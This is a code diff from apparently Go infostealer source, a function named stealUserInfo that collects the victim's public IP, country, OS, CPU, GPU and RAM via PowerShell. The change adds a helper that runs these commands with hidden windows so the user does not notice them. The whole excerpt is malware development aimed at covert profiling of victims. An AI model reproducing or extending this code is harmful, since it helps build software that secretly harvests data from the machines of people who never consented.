@@ -317,25 +317,23 @@ func stealUserInfo() string {
 	ip := getPublicIP()
 	country := getCountryByIP(ip)
 
-	osName := ""
-	cpuName := ""
-	gpuName := ""
-	ramSize := ""
-
-	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetOs()).Output(); err == nil {
-		osName = strings.TrimSpace(string(o))
-	}
-	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetCpu()).Output(); err == nil {
-		cpuName = strings.TrimSpace(string(o))
-	}
-	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetGpu()).Output(); err == nil {
-		gpuName = strings.TrimSpace(string(o))
-	}
-	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetRam()).Output(); err == nil {
-		ramBytes := strings.TrimSpace(string(o))
-		if v, err := strconv.ParseInt(ramBytes, 10, 64); err == nil {
-			ramSize = fmt.Sprintf("%d GB", v/1024/1024/1024)
+	hiddenCmd := func(name string, args ...string) string {
+		cmd := exec.Command(name, args...)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		o, err := cmd.Output()
+		if err != nil {
+			return ""
 		}
+		return strings.TrimSpace(string(o))
+	}
+
+	osName := hiddenCmd(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetOs())
+	cpuName := hiddenCmd(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetCpu())
+	gpuName := hiddenCmd(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetGpu())
+	ramSize := ""
+	ramBytes := hiddenCmd(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetRam())
+	if v, err := strconv.ParseInt(ramBytes, 10, 64); err == nil {
+		ramSize = fmt.Sprintf("%d GB", v/1024/1024/1024)
 	}
 
 	var sb strings.Builder
